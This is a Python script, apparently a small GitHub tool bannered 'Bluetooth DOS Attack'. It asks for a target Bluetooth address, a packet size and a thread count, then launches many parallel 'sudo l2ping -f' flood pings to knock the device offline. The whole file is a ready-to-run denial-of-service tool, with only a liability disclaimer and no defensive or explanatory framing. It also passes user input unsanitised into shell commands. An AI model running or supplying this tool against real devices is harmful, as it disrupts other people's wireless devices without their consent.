from os import system
from time import sleep
from threading import Thread


def setup_interface():
    system("sudo rfkill unblock bluetooth")
    system("sudo hciconfig -a hci0 up")


def attack(pack_size, targed_addr):
    system(f"sudo l2ping -i hci0 -s {pack_size} -f {targed_addr}")


def banner():
    print("{:.^71}".format("\x1b[37;4mhttps://github.com/DiegoBloise\x1b[0m"))
    print("\x1b[37;36m")
    print("""
    *****       *****            ***                       
     *   *       *   *          *   *                      
     *   *       *   *          *                          
     *   *       *   *          *       ****    ****       
     *   *       ****            ***   *    *  *    *      
     *   *       *   *              *  ******  *           
     *   *       *   *              *  *       *           
     *   * **    *   * **       *   *  *    *  *    *  **  
    *****  **   *****  **        ***    ****    ****   **
    """)
    print("\x1b[0m")
    print("{:.^60}".format("Bluetooth DOS Attack"))
    print("")


def main():
    banner()
    sleep(0.1)
    print()
    print("\x1b[31mTHIS SOFTWARE IS PROVIDED \"AS IS\" WITHOUT WARRANTY OF ANY KIND.\nYOU MAY USE THIS SOFTWARE AT YOUR OWN RISK.\nTHE USE IS COMPLETE RESPONSABILITY OF THE END-USER.\nTHE DEVELOPERS ASSUME NO LIABILITY AND ARE NOT RESPONSIBLE FOR\nANY MISUSE OR DAMAGE CAUSED BY THIS PROGRAM.\n")
    if (input("Do you agree? [y/n] ~> ") in ["Y", "y"]):
        sleep(0.1)
        system("clear")
        banner()
        print()

        targed_addr = input("{:>20}".format("Target address ~> "))

        if len(targed_addr) < 1:
            print("[!] ERROR: Target address is missing.")
            exit(0)
        
        try:
            pack_size = int(input("{:>20}".format("Packages size ~> ")))
        except:
            print("[!] ERROR: Packages size must be an integer.")
            exit(0)

        try:
            threads = int(input("{:>20}".format("Threads ~> ")))
        except:
            print("[!] ERROR: Threads must be an integer.")
            exit(0)

        print()
        system("clear")
        
        print(f"\x1b[31m[*] Starting DOS attack to {targed_addr} in 3 seconds...")

        for i in range(0, 3):
            print(f"[*] {3 - i}")
            sleep(1)

        system("clear")
        print("[*] Building threads...\n")

        for i in range(0, threads):
            print(f"[*] Built thread Nº {i + 1}")
            Thread(target=attack, args=[pack_size, targed_addr]).start()

        print("[*] Built all threads...")
        print("[*] Starting...")
    else:
        print("Finishing...")
        exit(0)

if __name__ == "__main__":
    try:
        system("clear")
        main()
    except KeyboardInterrupt:
        sleep(0.1)
        print("\n[*] Aborted by user.")
        exit(0)
    except Exception as error:
        sleep(0.1)
        print(f"[!] ERROR: {error}")

